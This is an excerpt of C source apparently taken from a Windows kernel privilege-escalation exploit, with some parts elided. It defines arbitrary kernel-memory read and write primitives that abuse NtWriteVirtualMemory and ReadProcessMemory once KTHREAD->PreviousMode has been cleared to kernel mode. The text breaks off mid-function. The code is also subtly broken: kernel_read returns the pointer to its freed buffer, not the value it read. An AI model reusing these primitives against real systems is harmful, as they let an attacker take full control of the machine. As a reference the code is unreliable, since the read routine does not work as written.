...
void kernel_write(PVOID target_address, ULONGLONG data_to_write);
ULONGLONG kernel_read(PVOID target_address);
...
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////// THIS IS USED AFTER KTHREAD->PREVIOUSMODE IS SET TO 0 (Kernel mode) //////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
...
void kernel_write(PVOID target_address, ULONGLONG data_to_write){
    ...
    if(pNtWriteVirtualMemory == NULL){
        printf("[xxx] Failed to resolve NtWriteVirtualMemory ... Error: %d\n", GetLastError());
        exit(1);
    }
  pNtWriteVirtualMemory(GetCurrentProcess(), target_address, &data_to_write, sizeof(ULONGLONG), NULL);
}

ULONGLONG kernel_read(PVOID target_address){
    ULONGLONG leak = 0;
    PVOID read_buffer = (PVOID)malloc(sizeof(ULONGLONG));
    if( read_buffer == NULL ) {
        printf("[xxx] Failed to allocate read buffer ... Error: %d\n", GetLastError());
        exit(1);
    }
    memset(read_buffer, 0x00, sizeof(ULONGLONG));
    SIZE_T read_bytes;
    if( !ReadProcessMemory(GetCurrentProcess(), (LPVOID)target_address, read_buffer, sizeof(ULONGLONG), &read_bytes) ){
        printf("[xxx] Failed to read from %llx ... Error: %d\n", target_address,  GetLastError());
        exit(1);
    }

    leak = (ULONGLONG)(ULONG_PTR)read_buffer;
    if(read_buffer){ 
        free(read_buffer);
    }
    return leak;
